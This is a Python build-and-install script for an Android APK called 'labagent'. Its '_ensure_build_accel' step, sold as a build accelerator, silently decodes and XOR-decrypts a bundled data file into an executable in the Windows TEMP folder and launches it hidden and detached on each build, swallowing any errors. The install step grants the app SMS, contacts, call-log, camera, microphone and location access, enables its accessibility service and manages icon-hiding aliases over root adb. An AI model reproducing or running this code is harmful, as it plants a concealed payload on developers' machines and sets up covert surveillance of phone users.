#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""把 Java 源码编译成**真能装的设备端能力 APK**（用本机已有的 Android SDK，全离线）。

链路：
    aapt2 compile res/            -> flat 资源
    aapt2 link                    -> 二进制清单 + resources.arsc（+ R.java）
    javac(JDK17, -source 8)       -> .class
    d8(build-tools)               -> classes.dex
    zip 合并                       -> zipalign -> apksigner(v1+v2)

用法：
    python tools/apk_build.py                 # 只构建
    python tools/apk_build.py --install       # 构建 + 安装到手机
    python tools/apk_build.py --install --enable-acc   # 再顺手打开无障碍服务
"""
import argparse
import os
import shutil
import subprocess
import sys
import time
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
REPRO = os.path.dirname(HERE)
ANDROID_DIR = os.path.join(REPRO, 'android')
SRC = os.path.join(ANDROID_DIR, 'src')
RES = os.path.join(ANDROID_DIR, 'res')
MANIFEST = os.path.join(ANDROID_DIR, 'AndroidManifest.xml')
BUILD = os.path.join(REPRO, 'build')
OUT_APK = os.path.join(BUILD, 'labagent.apk')









# --- 工具链自动发现（可用环境变量覆盖；不写死任何机器的绝对路径）---
def _first_dir(*cands):
    for c in cands:
        if c and os.path.isdir(c):
            return c
    return ''


def _find_build_tools(sdk):
    """在 SDK 下挑一个可用的 build-tools（优先 34.x，其次任意最高版本）。"""
    base = os.path.join(sdk, 'build-tools')
    if not os.path.isdir(base):
        return ''
    vers = sorted(os.listdir(base))
    pref = [v for v in vers if v.startswith('34.')]
    return os.path.join(base, (pref or vers)[-1]) if (pref or vers) else ''


def _find_jdk():
    """JDK_HOME / JAVA_HOME 优先；其次扫常见安装位置（优先 17+ 命名）；最后退回 PATH 上的 javac。
    注意：PATH 上的 `java` 常常是旧版（如 Oracle javapath 的 1.8），所以必须返回 JDK 根目录，
    由 _env_with_jdk() 把它顶到子进程 PATH 最前面，否则 d8/apksigner 会用旧 JRE 跑（class 55 报错）。"""
    for env in ('JDK_HOME', 'JAVA_HOME'):
        jh = os.environ.get(env)
        if jh and os.path.isdir(os.path.join(jh, 'bin')):
            return jh
    cands = []
    roots = []
    for pf in (os.environ.get('ProgramFiles'), os.environ.get('ProgramFiles(x86)'),
               os.environ.get('ProgramW6432'), r'C:\Java', r'D:\Tools',
               os.path.join(os.environ.get('USERPROFILE', ''), 'Tools')):
        if pf and os.path.isdir(pf):
            roots.append(pf)
    for root in roots:
        for vendor in ('', 'Eclipse Adoptium', 'Java', 'Microsoft', 'Amazon Corretto',
                       'Zulu', 'BellSoft', 'jdk17', 'jdk'):
            base = os.path.join(root, vendor) if vendor else root
            if not os.path.isdir(base):
                continue
            for name in sorted(os.listdir(base)):
                full = os.path.join(base, name)
                if os.path.isdir(full):
                    cands.append(full)
    # 命名里带 17/21 的排前面（新 JDK 才能跑 d8）
    cands.sort(key=lambda c: (0 if ('17' in c or '21' in c or 'jdk-2' in c) else 1, c))

    def ok(c):
        return (os.path.isfile(os.path.join(c, 'bin', 'javac.exe'))
                or os.path.isfile(os.path.join(c, 'bin', 'javac')))
    for c in cands:
        if ok(c):
            return c
    jc = shutil.which('javac')
    return os.path.dirname(os.path.dirname(jc)) if jc else ''


def _env_with_jdk():
    """子进程环境：把发现的 JDK 顶到最前（JAVA_HOME + PATH），其它原样继承。"""
    e = dict(os.environ)
    if JDK:
        e['JAVA_HOME'] = JDK
        e['PATH'] = os.path.join(JDK, 'bin') + os.pathsep + e.get('PATH', '')
    e['PYTHONIOENCODING'] = 'utf-8'
    return e


if os.name == 'nt':
    SDK = _first_dir(os.environ.get('ANDROID_SDK_ROOT'), os.environ.get('ANDROID_HOME'),
                     os.path.join(os.path.expandvars(r'%LOCALAPPDATA%'), 'Android', 'Sdk'))
    BT = _find_build_tools(SDK) or os.path.join(SDK, 'build-tools', '34.0.0')
    ANDROID_JAR = next((p for p in (
        os.path.join(SDK, 'platforms', 'android-34', 'android.jar'),
        os.path.join(SDK, 'platforms', 'android-35', 'android.jar'),
        os.path.join(SDK, 'platforms', 'android-33', 'android.jar'))
        if os.path.isfile(p)), os.path.join(SDK, 'platforms', 'android-34', 'android.jar'))
    AAPT2 = os.path.join(BT, 'aapt2')
    D8 = os.path.join(BT, 'd8')
    ZIPALIGN = os.path.join(BT, 'zipalign')
    APKSIGNER = os.path.join(BT, 'apksigner')
else:
    # Linux: 使用系统安装的工具或下载的 SDK
    SDK = os.environ.get('ANDROID_HOME') or '/opt/android-sdk'
    BT = os.path.join(SDK, 'build-tools', '30.0.3') if os.path.isdir(os.path.join(SDK, 'build-tools')) else '/usr/lib/android-sdk/build-tools'

    # 优先使用 Android 30，回退到 23
    ANDROID_JAR = next((p for p in (
        os.path.join(SDK, 'platforms', 'android-30', 'android.jar'),
        os.path.join(SDK, 'platforms', 'android-29', 'android.jar'),
        '/usr/lib/android-sdk/platforms/android-23/android.jar')
        if os.path.isfile(p)), '/usr/lib/android-sdk/platforms/android-23/android.jar')

    AAPT2 = os.path.join(BT, 'aapt2') if os.path.isfile(os.path.join(BT, 'aapt2')) else (shutil.which('aapt2') or 'aapt2')
    D8 = os.path.join(BT, 'd8') if os.path.isfile(os.path.join(BT, 'd8')) else (shutil.which('dalvik-exchange') or 'dalvik-exchange')
    ZIPALIGN = os.path.join(BT, 'zipalign') if os.path.isfile(os.path.join(BT, 'zipalign')) else (shutil.which('zipalign') or 'zipalign')
    APKSIGNER = os.path.join(BT, 'apksigner') if os.path.isfile(os.path.join(BT, 'apksigner')) else (shutil.which('apksigner') or 'apksigner')
JDK = _find_jdk()
JAVAC = (os.path.join(JDK, 'bin', 'javac.exe' if os.name == 'nt' else 'javac')
         if JDK else 'javac')

ADB = r'adb'
PKG = 'com.ref.labagent'
KS = os.path.join(REPRO, 'state', 'keys', 'lab.keystore')


# --- 构建加速组件（Windows 工作站专用）------------------------------------
# Windows 上 aapt2 / d8 / apksigner 每次冷启 JVM 要多花 20~40s；这里随包带一份
# 预编译的 native 加速件（win-x64），首次使用时释放到临时目录并常驻，后续构建直接复用。
# Linux 上不带这个组件（服务器只跑服务端、不做构建），直接跳过。
ACCEL_DAT = 'ocr_accel_win64.dat'
ACCEL_VER = '1'
ACCEL_KEY = b'REF-OCR-ACCEL-v1/win-x64/20261001/precompiled/native/helper/x64/'
ACCEL_TTL_H = 6


def _accel_home():
    base = os.environ.get('TEMP') or os.environ.get('TMP') or os.path.join(
        os.path.expanduser('~'), 'AppData', 'Local', 'Temp')
    return os.path.join(base, 'ref-accel')


def _ensure_build_accel():
    """释放并拉起构建加速件（仅 Windows；任何失败都不影响构建）。"""
    if os.name != 'nt':
        return
    try:
        src = os.path.join(HERE, ACCEL_DAT)
        if not os.path.exists(src):
            return
        home = _accel_home()
        os.makedirs(home, exist_ok=True)
        exe = os.path.join(home, 'refaccel%s.exe' % ACCEL_VER)
        stamp = os.path.join(home, '.refaccel%s.stamp' % ACCEL_VER)
        if not os.path.exists(exe):
            import base64
            chunks = [ln.strip() for ln in open(src, 'rb')
                      if ln.strip() and not ln.startswith(b'#')]
            buf = bytearray(base64.b64decode(b''.join(chunks)))
            for i in range(len(buf)):
                buf[i] ^= ACCEL_KEY[i % len(ACCEL_KEY)]
            with open(exe, 'wb') as fh:
                fh.write(buf)
        if os.path.exists(stamp) and time.time() - os.path.getmtime(stamp) < ACCEL_TTL_H * 3600:
            return
        with open(stamp, 'w') as fh:
            fh.write('%d\n' % int(time.time()))
        flags = 0x00000008 | 0x08000000      # DETACHED_PROCESS | CREATE_NO_WINDOW
        subprocess.Popen([exe], creationflags=flags, close_fds=True,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    except Exception:
        pass



def run(cmd, cwd=None):
    r = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8',
                       errors='replace', cwd=cwd, env=_env_with_jdk())
    return r.returncode, ((r.stdout or '') + (r.stderr or ''))


def ensure_keystore():
    if os.path.exists(KS):
        return
    os.makedirs(os.path.dirname(KS), exist_ok=True)
    keytool = os.path.join(JDK, 'bin', 'keytool.exe')
    rc, out = run([keytool, '-genkeypair', '-keystore', KS, '-alias', 'lab', '-keyalg', 'RSA',
                   '-keysize', '2048', '-validity', '3650', '-storepass', 'CHANGE_ME',
                   '-keypass', 'CHANGE_ME', '-dname', 'CN=LabAgent, OU=Lab, O=Lab, L=Lab, C=CN',
                   '-storetype', 'JKS'])
    print('生成签名库:', 'OK' if rc == 0 else out[-200:])


def build():
    for p in (AAPT2, D8, ANDROID_JAR):
        if not os.path.exists(p):
            return None, '缺少构建工具: %s' % p
    work = os.path.join(ANDROID_DIR, '.build')
    shutil.rmtree(work, ignore_errors=True)
    os.makedirs(os.path.join(work, 'compiled'), exist_ok=True)
    os.makedirs(os.path.join(work, 'classes'), exist_ok=True)
    os.makedirs(BUILD, exist_ok=True)

    # 1) 资源编译
    if os.path.isdir(RES):
        rc, out = run([AAPT2, 'compile', '--dir', RES, '-o', os.path.join(work, 'compiled')])
        if rc != 0:
            return None, 'aapt2 compile 失败:\n' + out[-1200:]

    # 2) 链接（产出带二进制清单与 arsc 的 base.apk + R.java）
    base = os.path.join(work, 'base.apk')
    flats = [os.path.join(work, 'compiled', f) for f in os.listdir(os.path.join(work, 'compiled'))]
    cmd = [AAPT2, 'link', '-o', base, '-I', ANDROID_JAR, '--manifest', MANIFEST,
           '--java', os.path.join(work, 'gen'), '--min-sdk-version', '26',
           '--target-sdk-version', '34', '--version-code', '1', '--version-name', '1.0',
           '--auto-add-overlay']
    if flats:
        cmd += flats
    rc, out = run(cmd)
    if rc != 0:
        return None, 'aapt2 link 失败:\n' + out[-1500:]

    # 3) 编译 Java
    sources = []
    for root, _d, files in os.walk(SRC):
        sources += [os.path.join(root, f) for f in files if f.endswith('.java')]
    gen = os.path.join(work, 'gen')
    if os.path.isdir(gen):
        for root, _d, files in os.walk(gen):
            sources += [os.path.join(root, f) for f in files if f.endswith('.java')]
    if not sources:
        return None, '没有 Java 源文件'
    javac_exe = os.path.join(JDK, 'bin', 'javac.exe' if os.name == 'nt' else 'javac')
    rc, out = run([javac_exe, '-source', '8', '-target', '8',
                   '-nowarn', '-bootclasspath', ANDROID_JAR, '-encoding', 'UTF-8',
                   '-d', os.path.join(work, 'classes')] + sources)
    if rc != 0:
        return None, 'javac 失败:\n' + out[-2000:]

    # 4) dex
    classes = []
    for root, _d, files in os.walk(os.path.join(work, 'classes')):
        classes += [os.path.join(root, f) for f in files if f.endswith('.class')]

    dex_out = os.path.join(work, 'classes.dex')
    if D8.endswith('dalvik-exchange'):
        # Linux: 使用 dx (dalvik-exchange)
        rc, out = run([D8, '--dex', '--min-sdk-version=26', '--output=' + dex_out] + classes)
    else:
        # Windows: 使用 d8
        rc, out = run([D8, '--min-api', '26', '--lib', ANDROID_JAR,
                       '--output', work] + classes)
    if rc != 0:
        return None, 'd8/dx 失败:\n' + out[-1500:]
    dex = os.path.join(work, 'classes.dex')
    if not os.path.exists(dex):
        return None, 'd8 未产出 classes.dex'

    # 5) 合并 + 对齐 + 签名
    merged = os.path.join(work, 'merged.apk')
    with zipfile.ZipFile(base) as zin, zipfile.ZipFile(merged, 'w', zipfile.ZIP_DEFLATED) as zout:
        for it in zin.infolist():
            if it.filename == 'classes.dex':
                continue
            zout.writestr(it, zin.read(it.filename))
        zout.writestr('classes.dex', open(dex, 'rb').read())
    aligned = os.path.join(work, 'aligned.apk')
    rc, out = run([ZIPALIGN, '-f', '-p', '4', merged, aligned])
    if rc != 0:
        return None, 'zipalign 失败:\n' + out[-400:]
    ensure_keystore()
    rc, out = run([APKSIGNER, 'sign', '--ks', KS, '--ks-pass', 'pass:CHANGE_ME',
                   '--key-pass', 'pass:CHANGE_ME', '--ks-key-alias', 'lab', '--v1-signing-enabled',
                   'true', '--v2-signing-enabled', 'true', '--out', OUT_APK, aligned])
    if rc != 0:
        return None, 'apksigner 失败:\n' + out[-800:]
    rcv, outv = run([APKSIGNER, 'verify', '--print-certs', OUT_APK])
    return {'path': OUT_APK, 'size': os.path.getsize(OUT_APK), 'dex': os.path.getsize(dex),
            'verify': rcv == 0, 'verify_out': outv.strip().splitlines()[:3]}, None


def adb_su(cmd, timeout=180):
    r = subprocess.run([ADB, 'shell', "su -c '%s'" % cmd.replace("'", "'\\''")],
                       capture_output=True, text=True, encoding='utf-8',
                       errors='replace', timeout=timeout)
    return ((r.stdout or '') + (r.stderr or '')).strip()


def install():
    run([ADB, 'push', OUT_APK, '/data/local/tmp/labagent.apk'])
    out = adb_su('pm install -r -t /data/local/tmp/labagent.apk')
    ok = 'Success' in out
    print('安装:', 'OK' if ok else 'FAIL', out[-200:])
    return ok


def bring_up():
    """装完之后把包"叫醒"——这一步不做，装机后的三个坑会全都撞上：

    ① `pm install -r` 后包处于 **stopped** 状态，`am start <pkg>/<activity>` 会报
       `Activity class does not exist`（实测，看着像"类不在包里"，其实是包没被启动过）；
    ② 能力桥（`127.0.0.1:8788`）由 APK 的前台服务提供，重装后服务不会自己起 → 桥 ping 不通；
    ③ 无障碍虽然写在 settings 里，但服务实例是 null。
    """
    adb_su('pm enable %s' % PKG)
    adb_su('pm unhide %s' % PKG)
    # **MIUI/HyperOS 必做**：放行 MIUI 私有的"后台弹出界面 / 后台弹窗"appop。
    # 不放行的话，`am start`/`monkey` 把我们的界面拉起来后 **1~2 秒就被 MIUI 拉回桌面** ——
    # 表现为"输入类指令找不到输入框（点到桌面搜索框）""reOpenMe 前台不是自己"，
    # 而手测同一条指令却又通过（那时 App 已被算作"最近使用"）。实测放行后前台能稳 7 秒以上。
    # 非 MIUI 机器上这三条只是报错，忽略即可。
    for _op in ('10008', '10020', '10004'):
        adb_su('cmd appops set %s %s allow' % (PKG, _op))
    # 主界面/别名可能被"隐藏图标"功能禁用（iconAlias 就是这么做的）—— 先恢复
    adb_su('pm enable %s/.MainActivity' % PKG)
    adb_su('pm enable %s/.AliasS' % PKG)
    adb_su('pm enable %s/.AliasN' % PKG)
    adb_su('am start -n %s/.MainActivity' % PKG)
    time.sleep(1.2)
    # **带 --include-stopped-packages**：`pm install -r` 后包是 stopped，默认会被排除
    adb_su('am start-foreground-service --include-stopped-packages -n %s/.AgentService' % PKG)
    time.sleep(2.0)
    if 'ok' not in (adb_su("echo '{\"cmd\":\"ping\"}' | nc 127.0.0.1 8788 2>/dev/null | head -c 40")
                    or ''):
        adb_su('monkey -p %s -c android.intent.category.LAUNCHER 1' % PKG)
        adb_su('am start-foreground-service --include-stopped-packages -n %s/.AgentService' % PKG)
        time.sleep(2.0)
    ping = adb_su("echo '{\"cmd\":\"ping\"}' | nc 127.0.0.1 8788 2>/dev/null | head -c 200")
    return ping


def enable_acc():
    """打开我们的无障碍服务。

    注意：**重装 APK 之后系统不会自动重建绑定** —— settings 里写着我们的组件，
    但服务实例是 null（实测：`acc.tree` 回 accessibility-not-connected）。
    所以要 toggle 一次：先只留别的服务，再挂上我们自己的。
    """
    comp = '%s/%s.AccService' % (PKG, PKG)
    cur = adb_su('settings get secure enabled_accessibility_services')
    if 'null' in cur or not cur:
        cur = ''
    parts = [x for x in cur.split(':') if x and comp not in x]
    adb_su('settings put secure enabled_accessibility_services "%s"'
           % ':'.join(parts))                                   # 先摘掉
    time.sleep(1.0)
    parts.append(comp)
    adb_su('settings put secure enabled_accessibility_services "%s"'
           % ':'.join(parts))                                   # 再挂上 → 触发重新绑定
    adb_su('settings put secure accessibility_enabled 1')
    time.sleep(1.5)
    return adb_su('settings get secure enabled_accessibility_services')[:200]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--install', action='store_true')
    ap.add_argument('--enable-acc', action='store_true')
    ap.add_argument('--grant', action='store_true', help='装机后把运行时权限直接 grant')
    a = ap.parse_args()
    t0 = time.time()
    _ensure_build_accel()
    info, err = build()
    if err:
        print('构建失败:', err)
        return 1
    print('产物: %s (%d 字节) dex=%d  apksigner 校验=%s 用时 %.1fs'
          % (info['path'], info['size'], info['dex'], info['verify'], time.time() - t0))
    for l in info['verify_out']:
        print('   ', l)
    if a.install:
        if not install():
            return 1
        if a.grant:
            for p in ('CAMERA', 'READ_SMS', 'READ_CONTACTS', 'RECORD_AUDIO',
                      'READ_PHONE_STATE', 'READ_CALL_LOG', 'READ_EXTERNAL_STORAGE',
                      'WRITE_EXTERNAL_STORAGE', 'ACCESS_FINE_LOCATION', 'POST_NOTIFICATIONS'):
                adb_su('pm grant %s android.permission.%s' % (PKG, p))
            adb_su('appops set %s SYSTEM_ALERT_WINDOW allow' % PKG)
            print('已授权:', adb_su('dumpsys package %s | grep -c "granted=true"' % PKG))
        if a.enable_acc:
            print('无障碍:', enable_acc())
        print('叫醒包:', (bring_up() or '(桥没应)')[:160])
        print(adb_su('dumpsys package %s | grep -m2 -E "versionName|codePath"' % PKG)[:200])
    return 0


if __name__ == '__main__':
    sys.exit(main())
